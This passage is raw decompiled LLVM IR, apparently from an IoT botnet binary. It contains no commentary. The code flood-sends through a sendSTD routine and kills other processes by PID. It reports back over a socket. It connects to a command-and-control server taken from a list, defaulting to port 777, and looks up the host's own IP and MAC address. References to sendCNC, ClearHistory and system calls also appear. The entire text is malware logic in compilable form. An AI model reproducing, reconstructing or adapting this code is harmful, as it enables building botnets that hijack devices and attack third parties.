  %v3_804f0cb = call i32 @sendSTD(i32 %v2_804f003, i32 %v1_804f013, i32 %v1_804f026)
  %v1_804f0d7 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f0dc:                             ; preds = %dec_label_pc_804f08b, %dec_label_pc_804f045, %dec_label_pc_804ef6a
  %v2_804f0df = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f0fc = inttoptr i32 %v2_804f0df to i8*
  %v7_804f10e = call i32 @_strncmp(i8* %v4_804f0fc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805fda5.667, i32 0, i32 0), i32 9)
  %v8_804f10e = urem i32 %v7_804f10e, 2
  %v9_804f10e = icmp eq i32 %v8_804f10e, 0
  %v0_804f110 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f110 = or i1 %v0_804f110, %v9_804f10e
  %v3_804f110 = zext i1 %v2_804f110 to i32
  %v4_804f110 = load i32, i32* @edx, align 4
  %v5_804f110 = and i32 %v4_804f110, -256
  %v6_804f110 = or i32 %v3_804f110, %v5_804f110
  %v7_804f110 = xor i32 %v6_804f110, 1
  store i32 %v7_804f110, i32* @edx, align 4
  %v1_804f118 = trunc i32 %v7_804f110 to i8
  %v3_804f118 = zext i1 %v0_804f110 to i8
  %v15_804f118 = icmp eq i8 %v1_804f118, %v3_804f118
  store i1 false, i1* @cf, align 1
  %v1_804f121 = icmp eq i1 %v15_804f118, false
  br i1 %v1_804f121, label %dec_label_pc_804f227, label %dec_label_pc_804f190

dec_label_pc_804f137:                             ; preds = %dec_label_pc_804f1cd, %dec_label_pc_804f190
  %v2_804f13a = mul i32 %storemerge1, 4
  %v9_804f13a = and i32 %storemerge1, 1073741824
  %v10_804f13a = icmp ne i32 %v9_804f13a, 0
  store i32 %v2_804f13a, i32* %edx.global-to-local, align 4
  %v0_804f13f = load i32, i32* @global_var_8068814.36, align 4
  %v2_804f144 = add i32 %v0_804f13f, %v2_804f13a
  %v1_804f147 = inttoptr i32 %v2_804f144 to i32*
  %v2_804f147 = load i32, i32* %v1_804f147, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f149 = icmp eq i32 %v2_804f147, 0
  br i1 %v1_804f149, label %dec_label_pc_804f18d, label %dec_label_pc_804f14d

dec_label_pc_804f14d:                             ; preds = %dec_label_pc_804f137
  store i1 %v10_804f13a, i1* %cf.global-to-local, align 1
  store i32 %v2_804f13a, i32* %edx.global-to-local, align 4
  %v2_804f15d = load i32, i32* %v1_804f147, align 4
  store i32 %v2_804f15d, i32* @ebx, align 4
  %v0_804f15f = call i32 @__libc_getpid()
  %v0_804f164 = load i32, i32* @ebx, align 4
  %v7_804f164 = icmp ult i32 %v0_804f164, %v0_804f15f
  store i1 %v7_804f164, i1* %cf.global-to-local, align 1
  %v12_804f164 = icmp eq i32 %v0_804f164, %v0_804f15f
  br i1 %v12_804f164, label %dec_label_pc_804f18d, label %dec_label_pc_804f168

dec_label_pc_804f168:                             ; preds = %dec_label_pc_804f14d
  store i1 %v10_804f13a, i1* %cf.global-to-local, align 1
  store i32 %v2_804f13a, i32* %edx.global-to-local, align 4
  %v0_804f170 = load i32, i32* @global_var_8068814.36, align 4
  %v2_804f175 = add i32 %v0_804f170, %v2_804f13a
  %v1_804f178 = inttoptr i32 %v2_804f175 to i32*
  %v2_804f178 = load i32, i32* %v1_804f178, align 4
  %v2_804f185 = call i32 @kill(i32 %v2_804f178, i32 9)
  %v4_804f18a = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804f18d

dec_label_pc_804f18d:                             ; preds = %dec_label_pc_804f14d, %dec_label_pc_804f137, %dec_label_pc_804f168
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804f137 ], [ %stack_var_-28.1, %dec_label_pc_804f14d ], [ %v4_804f18a, %dec_label_pc_804f168 ]
  %v4_804f18d = add i32 %storemerge1, 1
  br label %dec_label_pc_804f190

dec_label_pc_804f190:                             ; preds = %dec_label_pc_804f0dc, %dec_label_pc_804f18d
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804f18d ], [ 0, %dec_label_pc_804f0dc ]
  %storemerge1 = phi i32 [ %v4_804f18d, %dec_label_pc_804f18d ], [ 0, %dec_label_pc_804f0dc ]
  store i32 0, i32* @edi, align 4
  %v0_804f1a4 = load i32, i32* @global_var_8062588.34, align 8
  %v0_804f1a9 = load i32, i32* @global_var_806258c.35, align 4
  store i32 %v0_804f1a9, i32* %edx.global-to-local, align 4
  %v10_804f1c1 = icmp ne i32 %v0_804f1a9, 0
  store i1 %v10_804f1c1, i1* %cf.global-to-local, align 1
  br i1 %v10_804f1c1, label %dec_label_pc_804f137, label %dec_label_pc_804f1cd

dec_label_pc_804f1cd:                             ; preds = %dec_label_pc_804f190
  store i32 %v0_804f1a4, i32* @esi, align 4
  %v10_804f1e1 = icmp ult i32 %storemerge1, %v0_804f1a4
  store i1 %v10_804f1e1, i1* %cf.global-to-local, align 1
  br i1 %v10_804f1e1, label %dec_label_pc_804f137, label %dec_label_pc_804f1ed

dec_label_pc_804f1ed:                             ; preds = %dec_label_pc_804f1cd
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp206 = icmp slt i32 %stack_var_-28.1, 1
  %v0_804f212 = load i32, i32* @global_var_8062580.20, align 128
  br i1 %tmp206, label %dec_label_pc_804f212, label %dec_label_pc_804f1f3

dec_label_pc_804f1f3:                             ; preds = %dec_label_pc_804f1ed
  store i32 %v0_804f212, i32* %edx.global-to-local, align 4
  %v2_804f20b = call i32 @sockprintf(i32 %v0_804f212, i32 ptrtoint ([11 x i8]* @global_var_805fdae.668 to i32))
  br label %dec_label_pc_804f227

dec_label_pc_804f212:                             ; preds = %dec_label_pc_804f1ed
  %v2_804f222 = call i32 @sockprintf(i32 %v0_804f212, i32 ptrtoint ([13 x i8]* @global_var_805fdb9.669 to i32))
  br label %dec_label_pc_804f227

dec_label_pc_804f227:                             ; preds = %dec_label_pc_804f0dc, %dec_label_pc_804f1f3, %dec_label_pc_804f212
  %v2_804f22a = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f247 = inttoptr i32 %v2_804f22a to i8*
  store i32 ptrtoint ([10 x i8]* @global_var_805fdc6.670 to i32), i32* @edi, align 4
  %v7_804f259 = call i32 @_strncmp(i8* %v4_804f247, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805fdc6.670, i32 0, i32 0), i32 10)
  %v8_804f259 = urem i32 %v7_804f259, 2
  %v9_804f259 = icmp eq i32 %v8_804f259, 0
  %v0_804f25b = load i1, i1* @cf, align 1
  %v2_804f25b = or i1 %v0_804f25b, %v9_804f259
  %v3_804f25b = zext i1 %v2_804f25b to i32
  %v4_804f25b = load i32, i32* @edx, align 4
  %v5_804f25b = and i32 %v4_804f25b, -256
  %v6_804f25b = or i32 %v3_804f25b, %v5_804f25b
  %v7_804f25b = xor i32 %v6_804f25b, 1
  store i32 %v7_804f25b, i32* %edx.global-to-local, align 4
  %v1_804f263 = trunc i32 %v7_804f25b to i8
  %v3_804f263 = zext i1 %v0_804f25b to i8
  %v4_804f263 = sub nsw i8 %v1_804f263, %v3_804f263
  %v15_804f263 = icmp eq i8 %v4_804f263, 0
  %v2_804f267 = sext i8 %v4_804f263 to i32
  store i32 %v2_804f267, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f26c = icmp eq i1 %v15_804f263, false
  br i1 %v1_804f26c, label %dec_label_pc_804f27a, label %dec_label_pc_804f26e

dec_label_pc_804f26e:                             ; preds = %dec_label_pc_804f227
  %v1_804f275 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804f27a

dec_label_pc_804f27a:                             ; preds = %dec_label_pc_804e91b, %dec_label_pc_804e8b2, %dec_label_pc_804ec6b, %dec_label_pc_804f227, %dec_label_pc_804f0aa, %dec_label_pc_804ef38, %dec_label_pc_804ed61, %dec_label_pc_804e93d, %dec_label_pc_804e514, %dec_label_pc_804e477, %dec_label_pc_804e345, %dec_label_pc_804e2b6, %dec_label_pc_804efe3, %dec_label_pc_804ee64, %dec_label_pc_804ea6f, %dec_label_pc_804e793, %dec_label_pc_804e659, %dec_label_pc_804e535, %dec_label_pc_804e37a, %dec_label_pc_804e1fb, %dec_label_pc_804e190, %dec_label_pc_804e12f, %dec_label_pc_804f26e
  %v0_804f284 = phi i32 [ %v2_804ec60, %dec_label_pc_804ec6b ], [ %v2_804f267, %dec_label_pc_804f227 ], [ %v0_804f0aa, %dec_label_pc_804f0aa ], [ %v0_804ef38, %dec_label_pc_804ef38 ], [ %v0_804ed61, %dec_label_pc_804ed61 ], [ %v0_804e93d, %dec_label_pc_804e93d ], [ %v0_804e514, %dec_label_pc_804e514 ], [ 0, %dec_label_pc_804e477 ], [ %v0_804e345, %dec_label_pc_804e345 ], [ 0, %dec_label_pc_804e2b6 ], [ %v2_804eff3, %dec_label_pc_804efe3 ], [ %v2_804ee74, %dec_label_pc_804ee64 ], [ %v2_804ea7f, %dec_label_pc_804ea6f ], [ %v2_804e7a3, %dec_label_pc_804e793 ], [ %v2_804e67b, %dec_label_pc_804e659 ], [ %v1_804e521, %dec_label_pc_804e535 ], [ %v1_804e352, %dec_label_pc_804e37a ], [ %v1_804e217, %dec_label_pc_804e1fb ], [ %v2_804e1aa, %dec_label_pc_804e190 ], [ %v2_804e13f, %dec_label_pc_804e12f ], [ %v1_804f275, %dec_label_pc_804f26e ], [ %v2_804e8c0, %dec_label_pc_804e8b2 ], [ %v2_804e92a, %dec_label_pc_804e91b ]
  %v0_804f27a = load i32, i32* @esp, align 4
  %v5_804f27a = icmp ugt i32 %v0_804f27a, -477
  store i1 %v5_804f27a, i1* %cf.global-to-local, align 1
  %v2_804f280 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f280, i32* @ebx, align 4
  store i32 %v0_804ded5, i32* @esi, align 4
  store i32 %v0_804ded4, i32* @edi, align 4
  ret i32 %v0_804f284

; uselistorder directives
  uselistorder i1 %v0_804f25b, { 1, 0 }
  uselistorder i32 %v0_804f212, { 2, 1, 0 }
  uselistorder i32 %v0_804f1a4, { 1, 0 }
  uselistorder i32 %storemerge1, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804f13a, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804f110, { 1, 0 }
  uselistorder i32 %v2_804f09a, { 1, 0 }
  uselistorder i32 %v1_804f026, { 1, 0 }
  uselistorder i32 %v1_804f013, { 1, 0 }
  uselistorder i32 %v2_804f003, { 2, 1, 0, 3 }
  uselistorder i1 %v0_804ef9e, { 1, 0 }
  uselistorder i32 %v2_804ef28, { 1, 0 }
  uselistorder i32 %v1_804eea7, { 1, 0 }
  uselistorder i32 %v1_804ee94, { 1, 0 }
  uselistorder i32 %v2_804ee84, { 2, 1, 0, 3 }
  uselistorder i1 %v0_804ee1f, { 1, 0 }
  uselistorder i32 %v1_804eda7, { 1, 0 }
  uselistorder i32 %v1_804ecf7, { 1, 0 }
  uselistorder i32* %v1_804ec7b, { 2, 0, 1, 3 }
  uselistorder i1 %v5_804ec78, { 2, 0, 1, 3 }
  uselistorder i1 %v0_804ec54, { 1, 0 }
  uselistorder i32 %v7_804ec52, { 1, 0 }
  uselistorder i32 %v2_804ebc6, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0, 2 }
  uselistorder i32 %storemerge7, { 1, 0, 2 }
  uselistorder i32 %v2_804ead3, { 1, 0 }
  uselistorder i32 %v1_804eac5, { 1, 0 }
  uselistorder i32 %v1_804eab2, { 1, 0 }
  uselistorder i32 %v1_804ea9f, { 1, 0 }
  uselistorder i32 %v2_804ea8f, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804ea36, { 1, 0 }
  uselistorder i32 %v1_804ea31, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804e9c6, { 1, 0 }
  uselistorder i32 %v2_804e92a, { 0, 2, 1 }
  uselistorder i32 %v2_804e8c0, { 1, 0, 2 }
  uselistorder i32 %storemerge9, { 1, 0, 2 }
  uselistorder i32 %storemerge10208, { 1, 0 }
  uselistorder i32 %v1_804e815, { 2, 1, 0 }
  uselistorder i32 %v1_804e7fc, { 1, 0 }
  uselistorder i32 %v1_804e7e9, { 1, 0 }
  uselistorder i32 %v1_804e7d6, { 1, 0 }
  uselistorder i32 %v1_804e7c3, { 1, 0 }
  uselistorder i32 %v2_804e7b3, { 2, 1, 0, 3 }
  uselistorder i1 %v8_804e779, { 1, 0, 2 }
  uselistorder i32 %v1_804e774, { 1, 0 }
  uselistorder i32 %v1_804e76f, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804e75d, { 1, 0 }
  uselistorder i32 %v1_804e758, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804e746, { 1, 0 }
  uselistorder i32 %v1_804e741, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804e6b9, { 1, 0 }
  uselistorder i1 %v0_804e646, { 1, 0 }
  uselistorder i1 %v0_804e5be, { 1, 0 }
  uselistorder i1 %v0_804e501, { 1, 0 }
  uselistorder i1 %v0_804e464, { 1, 0 }
  uselistorder i1 %v0_804e416, { 1, 0 }
  uselistorder i1 %v0_804e32e, { 1, 0 }
  uselistorder i1 %v0_804e2a3, { 1, 0 }
  uselistorder i1 %v0_804e255, { 1, 0 }
  uselistorder i1 %v0_804e1e8, { 1, 0 }
  uselistorder i1 %v0_804e17d, { 1, 0 }
  uselistorder i1 %v0_804e11c, { 1, 0 }
  uselistorder i1 %v0_804e0af, { 1, 0 }
  uselistorder i1 %v0_804e03f, { 1, 0 }
  uselistorder i1 %v0_804dfcf, { 1, 0 }
  uselistorder i1 %v0_804df5f, { 1, 0 }
  uselistorder i1 %v0_804df11, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp189, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 11, 10, 12, 13, 17, 14, 15, 16, 18, 19, 22, 20, 21, 23, 24, 25, 26, 28, 27, 29, 30, 31 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 163, 9, 11, 10, 164, 12, 13, 14, 15, 16, 17, 18, 19, 20, 165, 21, 23, 22, 166, 24, 25, 26, 27, 28, 29, 30, 31, 32, 158, 33, 34, 35, 36, 37, 43, 38, 39, 40, 41, 42, 159, 44, 45, 46, 47, 48, 160, 49, 51, 50, 161, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 108, 76, 78, 77, 162, 79, 80, 81, 82, 83, 84, 167, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 110, 111, 113, 112, 114, 125, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 137, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80581b1.223 to i32), { 3, 4, 2, 5, 1, 6, 0, 7, 8, 9, 10, 11 }
  uselistorder i32* inttoptr (i32 -25 to i32*), { 2, 3, 1, 0, 4, 5 }
  uselistorder i32* inttoptr (i32 -13 to i32*), { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 ()* @ClearHistory, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %arg2, { 8, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4, 5, 6, 7, 16, 17, 1, 18, 19, 0, 20, 21, 22, 23, 26, 25, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 %arg1, { 10, 18, 9, 17, 8, 16, 0, 15, 7, 6, 14, 5, 13, 2, 4, 1, 12, 3, 11 }
  uselistorder label %dec_label_pc_804f27a, { 22, 3, 4, 12, 5, 13, 6, 2, 14, 7, 0, 1, 15, 16, 17, 8, 9, 18, 10, 11, 19, 20, 21 }
  uselistorder label %dec_label_pc_804f227, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f190, { 1, 0 }
  uselistorder label %dec_label_pc_804f18d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f05d, { 1, 0 }
  uselistorder label %dec_label_pc_804efe3, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804eede, { 1, 0 }
  uselistorder label %dec_label_pc_804ee64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ecb5, { 1, 0 }
  uselistorder label %dec_label_pc_804ec20, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804eb6d, { 1, 0 }
  uselistorder label %dec_label_pc_804eb31, { 1, 0 }
  uselistorder label %dec_label_pc_804eb00, { 1, 0 }
  uselistorder label %dec_label_pc_804ea6f, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804ea55, { 1, 0 }
  uselistorder label %dec_label_pc_804e8ca, { 1, 0 }
  uselistorder label %dec_label_pc_804e88e, { 1, 0 }
  uselistorder label %dec_label_pc_804e85d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e793, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804e4ca, { 1, 0 }
  uselistorder label %dec_label_pc_804e2f7, { 1, 0 }
  uselistorder label %dec_label_pc_804e0e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e078, { 1, 0 }
  uselistorder label %dec_label_pc_804e008, { 1, 0 }
  uselistorder label %dec_label_pc_804df98, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f285 = load i32, i32* @ebp, align 4
  store i32 %v0_804f285, i32* %stack_var_-4, align 4
  %v4_804f285 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804f285, i32* @ebp, align 4
  %v2_804f28e = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804f2aa = bitcast i32* %stack_var_-4104 to i8*
  %v4_804f2aa = call i32 @__GI_memset(i8* %v3_804f2aa, i32 0, i32 4096)
  %v0_804f2af = load i32, i32* @global_var_8062580.20, align 128
  %v1_804f2b4 = icmp eq i32 %v0_804f2af, 0
  br i1 %v1_804f2b4, label %dec_label_pc_804f2cf, label %dec_label_pc_804f2b8

dec_label_pc_804f2b8:                             ; preds = %entry
  %v1_804f2c0 = call i32 @__libc_close(i32 %v0_804f2af)
  store i32 0, i32* @global_var_8062580.20, align 128
  br label %dec_label_pc_804f2cf

dec_label_pc_804f2cf:                             ; preds = %entry, %dec_label_pc_804f2b8
  %v0_804f2cf = load i32, i32* @global_var_806219c.671, align 4
  %v1_804f2d4 = icmp eq i32 %v0_804f2cf, 0
  %v1_804f2d6 = icmp eq i1 %v1_804f2d4, false
  br i1 %v1_804f2d6, label %dec_label_pc_804f2e4, label %dec_label_pc_804f2ef

dec_label_pc_804f2e4:                             ; preds = %dec_label_pc_804f2cf
  %v1_804f2e9 = add i32 %v0_804f2cf, 1
  br label %dec_label_pc_804f2ef

dec_label_pc_804f2ef:                             ; preds = %dec_label_pc_804f2cf, %dec_label_pc_804f2e4
  %storemerge = phi i32 [ %v1_804f2e9, %dec_label_pc_804f2e4 ], [ 0, %dec_label_pc_804f2cf ]
  store i32 %storemerge, i32* @global_var_806219c.671, align 4
  %v1_804f2f4 = mul i32 %storemerge, 4
  %v2_804f2f4 = add i32 %v1_804f2f4, ptrtoint ([18 x i8]** @global_var_8062198.672 to i32)
  %v3_804f2f4 = inttoptr i32 %v2_804f2f4 to i32*
  %v4_804f2f4 = load i32, i32* %v3_804f2f4, align 4
  store i32 %v4_804f2f4, i32* @eax, align 4
  %v3_804f308 = call i32 @strcpy(i8* %v3_804f2aa, i32 %v4_804f2f4)
  %v3_804f325 = call i32 @__GI_strchr(i8* %v3_804f2aa, i32 58)
  %v1_804f32a = icmp eq i32 %v3_804f325, 0
  br i1 %v1_804f32a, label %dec_label_pc_804f369, label %dec_label_pc_804f32e

dec_label_pc_804f32e:                             ; preds = %dec_label_pc_804f2ef
  %v3_804f33f = call i32 @__GI_strchr(i8* %v3_804f2aa, i32 58)
  %v1_804f344 = add i32 %v3_804f33f, 1
  %v1_804f348 = call i32 @atol(i32 %v1_804f344)
  %v3_804f361 = call i32 @__GI_strchr(i8* %v3_804f2aa, i32 58)
  %v4_804f361 = inttoptr i32 %v3_804f361 to i8*
  store i8 0, i8* %v4_804f361, align 1
  br label %dec_label_pc_804f369

dec_label_pc_804f369:                             ; preds = %dec_label_pc_804f2ef, %dec_label_pc_804f32e
  %stack_var_-8.0 = phi i32 [ 777, %dec_label_pc_804f2ef ], [ %v1_804f348, %dec_label_pc_804f32e ]
  %v3_804f380 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804f380, i32* @global_var_8062580.20, align 128
  %v4_804f3ac = call i32 @connectTimeout(i32 %v3_804f380, i32 %v2_804f28e, i32 %stack_var_-8.0, i32 30)
  %v1_804f3b1 = icmp eq i32 %v4_804f3ac, 0
  %. = zext i1 %v1_804f3b1 to i32
  %v2_804f3d1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f3d1, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f369, { 1, 0 }
  uselistorder label %dec_label_pc_804f2ef, { 1, 0 }
  uselistorder label %dec_label_pc_804f2cf, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f3d3 = load i32, i32* @ebp, align 4
  store i32 %v0_804f3d3, i32* %stack_var_-4, align 4
  %v5_804f3f3 = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804f3fb = icmp eq i32 %v5_804f3f3, -1
  %v1_804f3ff = icmp eq i1 %v13_804f3fb, false
  br i1 %v1_804f3ff, label %dec_label_pc_804f410, label %dec_label_pc_804f5ee

dec_label_pc_804f410:                             ; preds = %entry
  %v2_804f410 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804f43b = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_805fdd0.673 to i32))
  %v3_804f44a = call i32 @htons(i16 53)
  %v5_804f46b = call i32 @__libc_connect(i32 %v5_804f3f3, i32 %v2_804f410, i32 16)
  %v13_804f473 = icmp eq i32 %v5_804f46b, -1
  %v1_804f477 = icmp eq i1 %v13_804f473, false
  br i1 %v1_804f477, label %dec_label_pc_804f488, label %dec_label_pc_804f5ee

dec_label_pc_804f488:                             ; preds = %dec_label_pc_804f410
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804f48f = ptrtoint i32* %stack_var_-56 to i32
  %v2_804f492 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804f4a3 = call i32 @__GI_getsockname(i32 %v5_804f3f3, i32 %v2_804f48f, i32 %v2_804f492)
  %v13_804f4ab = icmp eq i32 %v5_804f4a3, -1
  %v1_804f4af = icmp eq i1 %v13_804f4ab, false
  br i1 %v1_804f4af, label %dec_label_pc_804f4c0, label %dec_label_pc_804f5ee

dec_label_pc_804f4c0:                             ; preds = %dec_label_pc_804f488
  %v5_804f4d7 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805fdd8.674, i32 0, i32 0), i32 0)
  %v2_804f53c = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804f55434 = call i32 @fdgets(i32 %v2_804f53c, i32 4096, i32 %v5_804f4d7)
  %v1_804f55935 = icmp eq i32 %v5_804f55434, 0
  %v1_804f55b37 = icmp eq i1 %v1_804f55935, false
  br i1 %v1_804f55b37, label %dec_label_pc_804f4e1, label %dec_label_pc_804f55d

dec_label_pc_804f4e1:                             ; preds = %dec_label_pc_804f4c0, %dec_label_pc_804f51b
  %v5_804f4f2 = call i32 @strstr(i32 %v2_804f53c, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805fde8.675, i32 0, i32 0))
  %v1_804f4f7 = icmp eq i32 %v5_804f4f2, 0
  br i1 %v1_804f4f7, label %dec_label_pc_804f51b, label %dec_label_pc_804f509

dec_label_pc_804f506:                             ; preds = %dec_label_pc_804f509
  %v4_804f509 = ptrtoint i8* %storemerge5 to i32
  %v5_804f506 = add i32 %v4_804f509, 1
  %v22_804f506 = inttoptr i32 %v5_804f506 to i8*
  br label %dec_label_pc_804f509

dec_label_pc_804f509:                             ; preds = %dec_label_pc_804f4e1, %dec_label_pc_804f506
  %storemerge5 = phi i8* [ %v22_804f506, %dec_label_pc_804f506 ], [ %stack_var_-4156, %dec_label_pc_804f4e1 ]
  %v2_804f50c = load i8, i8* %storemerge5, align 1
  %v10_804f50f = icmp eq i8 %v2_804f50c, 9
  %v1_804f511 = icmp eq i1 %v10_804f50f, false
  br i1 %v1_804f511, label %dec_label_pc_804f506, label %dec_label_pc_804f513

dec_label_pc_804f513:                             ; preds = %dec_label_pc_804f509
  store i8 0, i8* %storemerge5, align 1
  br label %dec_label_pc_804f55d

dec_label_pc_804f51b:                             ; preds = %dec_label_pc_804f4e1
  %v6_804f537 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804f554 = call i32 @fdgets(i32 %v2_804f53c, i32 4096, i32 %v5_804f4d7)
  %v1_804f559 = icmp eq i32 %v5_804f554, 0
  %v1_804f55b = icmp eq i1 %v1_804f559, false
  br i1 %v1_804f55b, label %dec_label_pc_804f4e1, label %dec_label_pc_804f55d

dec_label_pc_804f55d:                             ; preds = %dec_label_pc_804f4c0, %dec_label_pc_804f51b, %dec_label_pc_804f513
  %v2_804f563 = call i32 @__libc_close(i32 %v5_804f4d7)
  %v3_804f568 = load i8, i8* %stack_var_-4156, align 1
  %v4_804f56f = icmp eq i8 %v3_804f568, 0
  br i1 %v4_804f56f, label %dec_label_pc_804f5d5, label %dec_label_pc_804f573

dec_label_pc_804f573:                             ; preds = %dec_label_pc_804f55d
  %v2_804f57d = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804f57d, i32* @eax, align 4
  %tmp32 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804f586 = call i32 @strcpy(i8* %tmp32, i32 %v2_804f53c)
  %v5_804f5a3 = call i32 @ioctl(i32 %v5_804f3f3, i32 35111, i32 %v2_804f57d)
  %v2_804f5ba = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804f5b1

dec_label_pc_804f5b1:                             ; preds = %dec_label_pc_804f573, %dec_label_pc_804f5b1
  %storemerge33 = phi i32 [ 0, %dec_label_pc_804f573 ], [ %v4_804f5cc, %dec_label_pc_804f5b1 ]
  %v2_804f5c0 = add i32 %storemerge33, %v2_804f5ba
  %v1_804f5c3 = inttoptr i32 %v2_804f5c0 to i8*
  %v2_804f5c3 = load i8, i8* %v1_804f5c3, align 1
  %v3_804f5c6 = add i32 %storemerge33, ptrtoint (i8** @global_var_8062590.676 to i32)
  %v4_804f5c6 = inttoptr i32 %v3_804f5c6 to i8*
  store i8 %v2_804f5c3, i8* %v4_804f5c6, align 1
  %v4_804f5cc = add nuw nsw i32 %storemerge33, 1
  %exitcond = icmp eq i32 %v4_804f5cc, 6
  br i1 %exitcond, label %dec_label_pc_804f5d5, label %dec_label_pc_804f5b1

dec_label_pc_804f5d5:                             ; preds = %dec_label_pc_804f5b1, %dec_label_pc_804f55d
  %v2_804f5db = call i32 @__libc_close(i32 %v5_804f3f3)
  br label %dec_label_pc_804f5ee

dec_label_pc_804f5ee:                             ; preds = %entry, %dec_label_pc_804f410, %dec_label_pc_804f488, %dec_label_pc_804f5d5
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_804f5d5 ], [ 0, %dec_label_pc_804f488 ], [ 0, %dec_label_pc_804f410 ], [ 0, %entry ]
  %v2_804f5f4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f5f4, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i8* %storemerge5, { 0, 2, 1 }
  uselistorder i32 %v2_804f53c, { 1, 3, 2, 0 }
  uselistorder i32 %v5_804f4d7, { 1, 2, 0 }
  uselistorder i32 %v5_804f3f3, { 2, 1, 3, 4, 0 }
